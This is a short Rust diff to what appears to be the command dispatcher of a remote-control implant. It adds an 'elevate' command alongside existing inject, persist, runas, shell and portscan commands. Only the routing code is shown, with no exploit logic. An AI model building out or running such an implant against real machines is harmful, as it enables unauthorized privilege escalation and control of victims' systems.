@@ -7,6 +7,7 @@ use crate::config::ConfigOptions;
 // Command modules
 mod cd;
 mod download;
+pub mod elevate;
 pub mod getprivs;
 mod inject;
 mod persist;
@@ -15,7 +16,7 @@ mod ps;
 mod pwd;
 mod runas;
 mod save;
-mod shell;
+pub mod shell;
 mod sleep;
 mod shutdown;
 mod unknown;
@@ -24,6 +25,7 @@ mod unknown;
 pub enum CommandType {
     Cd(String),
     Download(String),
+    Elevate(String),
     Getprivs,
     Inject(String),
     Portscan(String),
@@ -73,6 +75,7 @@ impl NotionCommand {
             let command_type: CommandType = match t {
                 "cd"       => CommandType::Cd(command_string),
                 "download" => CommandType::Download(command_string),
+                "elevate"  => CommandType::Elevate(command_string),
                 "getprivs" => CommandType::Getprivs,
                 "inject"   => CommandType::Inject(command_string),
                 "persist"  => CommandType::Persist(command_string),
@@ -97,6 +100,7 @@ impl NotionCommand {
         match &self.command_type {
             CommandType::Cd(s)       => cd::handle(&s),
             CommandType::Download(s) => download::handle(&s).await,
+            CommandType::Elevate(s)  => elevate::handle(&s, config_options).await,
             CommandType::Getprivs    => getprivs::handle().await,
             CommandType::Inject(s)   => inject::handle(&s).await,
             CommandType::Persist(s)  => persist::handle(&s, config_options).await,
